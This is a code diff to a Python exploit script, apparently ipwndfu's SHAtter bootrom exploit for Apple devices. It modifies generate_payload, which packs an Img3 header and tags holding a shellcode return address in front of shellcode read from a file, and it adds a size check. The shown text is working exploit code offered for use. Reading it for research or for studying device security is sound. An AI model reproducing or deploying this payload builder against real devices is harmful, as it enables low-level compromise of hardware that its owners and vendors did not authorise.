@@ -3,11 +3,12 @@ import dfu
 
 def generate_payload():
     shellcode_address = 0x8402F198 + 1
-    data = struct.pack('<4s2I28sI', 'DATA'[::-1], 12 + 32, 32, '\xF0' * 28, shellcode_address)
+    data = struct.pack('<40sI', '\xF0' * 40, shellcode_address)
     tags = data + struct.pack('<4s2I4s2I', 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)
     header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(tags), len(tags), len(data), 'ibss'[::-1])
     with open('bin/SHAtter-shellcode.bin', 'rb') as f:
         shellcode = f.read()
+    assert len(shellcode) <= 1024
     return header + tags + shellcode
 
 def exploit():
